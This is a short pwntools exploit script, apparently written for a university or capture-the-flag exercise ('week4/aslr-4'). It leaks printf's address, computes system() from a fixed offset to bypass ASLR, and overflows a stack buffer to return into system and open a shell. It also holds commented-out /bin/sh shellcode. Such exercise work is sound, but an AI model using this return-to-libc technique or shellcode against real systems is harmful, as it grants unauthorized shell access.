#!/usr/bin/env python

from pwn import *

env = {
        "PATH": "/home/users/didnera/week4/aslr-4"
    }



# create process and run the program
p = process("./aslr-4",env=env)




#p = process("./aslr-x")
context.terminal = ["tmux", "splitw", "-h"]
#gdb.attach(p)

'''
buf = "A" * 0x100
# for generating core
if not os.path.exists('core'):
    p.sendline(buf)
    p.wait()

c = Core('./core')

buffer_addr = c.stack.find(buf)
buffer_addr = c.stack.find('/bin/sh')
print(buffer_addr)

p.interactive()
'''

string = p.recv()
printfaddr = string[66:76]
#print("STRING!!!: " + string)

#print("STINRG: "+ string_buffer_start)
printf_addr = int(printfaddr,16)
#offset = (0x67dce670 - 0x67d6fda0)
#print(offset)
true_offset = 0xe8d0
system_addr = printf_addr - true_offset

#shell_code = "j2X\xcd\x80\x89\xc3\x89\xc1jGX\xcd\x801\xc91\xd2j\x0bXQhn/shh//bi\x89\xe3\xcd\x80"

sym_link_string_address = p32(0x80482a7)


buff = "A"*(0x88) + "BBBB" + p32(system_addr) + "CCCC" + sym_link_string_address
p.sendline(buff)


# open an interactive console to the program
p.interactive()